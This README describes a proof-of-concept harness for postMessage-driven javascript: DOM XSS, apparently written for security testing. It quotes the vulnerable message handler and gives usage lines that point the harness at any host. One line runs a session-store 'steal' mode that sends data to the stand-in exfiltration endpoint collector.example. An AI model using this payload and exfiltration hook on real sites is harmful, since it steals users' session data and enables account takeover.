# postMessage → `javascript:` PoC harness

A single static page that drives a well-known class of DOM XSS: a page whose `message` handler takes a
URL out of the message and navigates to it

```js
window.addEventListener('message', function (e) {
  if (e.data && e.data.type === 'REDIRECT_TO_PROVIDER' && e.data.source === 'mfe') {
    var r = e.data.url;
    window.top ? window.top.location.href = r : window.parent.location.href = r;
  }
});
```

…without validating `e.origin`, `e.source` or the URL scheme. A `javascript:` URL supplied by any
window that holds a handle to the target therefore executes in the target origin.

This repository contains **no target-specific data** — the target is passed in the URL, so the page
can be pointed at whatever host the finding concerns.

## Usage

```
poc.html?target=https://target.example/some/route/
poc.html?target=https://target.example/some/route/&p=steal
poc.html?target=https://target.example/some/route/&p=steal&hook=https://collector.example/hit
poc.html?target=https://target.example/some/route/&msg={"type":"X","source":"mfe","url":"__URL__"}
```

| parameter | meaning |
|---|---|
| `target` | page to open (https only); `__URL__` in `msg` is replaced by the payload |
| `p` | `alert` (default) → `alert()` carrying `document.domain`; `steal` → read a redux session store through the React fiber tree and optionally forward it |
| `hook` | optional exfiltration endpoint (`fetch`-free, uses an `Image()` GET) |
| `msg` | full JSON message to send instead of the default shape |
| `auto` | `0` disables auto-start |

Allow pop-ups for the page; the dialog appears **in the target window**, not here.

## Why a window handle is required

`postMessage` needs a reference to the target window: one you opened (`window.open`), your iframe or
popup child, or your opener/parent. Navigation alone cannot deliver the message, and if the sink
targets `window.top` (as the snippet above does), the vulnerable document must itself be the
top-level document — an iframe would only ever navigate *your* window and cross-origin `javascript:`
navigation is blocked.

## Known precondition

Sinks like this usually live on a post-authentication view, i.e. the handler is only registered after
the target site's own client-side route mounts. A browser window cannot inherit an in-memory session
by navigation, so the tester generally has to be signed in inside the window this page opens.

## Files

| file | purpose |
|---|---|
| `index.html` | landing page |
| `poc.html` | the harness (self-contained, no dependencies) |
| `.nojekyll` | serve files verbatim on GitHub Pages |
| `.github/workflows/pages.yml` | Pages deployment workflow |
